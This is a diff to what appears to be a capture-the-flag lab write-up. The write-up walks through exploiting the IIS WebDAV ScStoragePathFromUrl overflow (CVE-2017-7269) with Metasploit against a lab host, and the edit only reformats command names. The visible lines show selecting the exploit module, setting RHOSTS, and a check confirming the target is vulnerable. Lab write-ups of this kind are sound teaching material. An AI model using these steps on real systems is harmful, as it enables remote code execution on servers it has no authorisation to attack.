@@ -224,7 +224,7 @@ Matching Modules
 It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, please take a moment to read through the results. This time the _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_ exploit will be used (search result number 15 on the list), which is related to the [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/) vulnerability and is also know as "Exploding Can". Note that when successful, the execution of this exploit leads to remote code execution.
 
 ### Select an exploit and set its options
-The _use_ command will be used to select the exploit to be executed, and _show options_ to get the options that have to be set in order to execute it:
+The `use` command will be used to select the exploit to be executed, and `show options` to get the options that have to be set in order to execute it:
 ```
 msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
 
@@ -267,7 +267,7 @@ RHOSTS => 10.10.10.14
 ```
 
 ### Run the exploit and gain access to the system
-A really interesting feature of Metasploit modules is that some of them have a _check_ function to verify if the target host is vulnerable:
+A really interesting feature of Metasploit modules is that some of them have a `check` function to verify if the target host is vulnerable:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
 [+] 10.10.10.14:80 - The target is vulnerable.
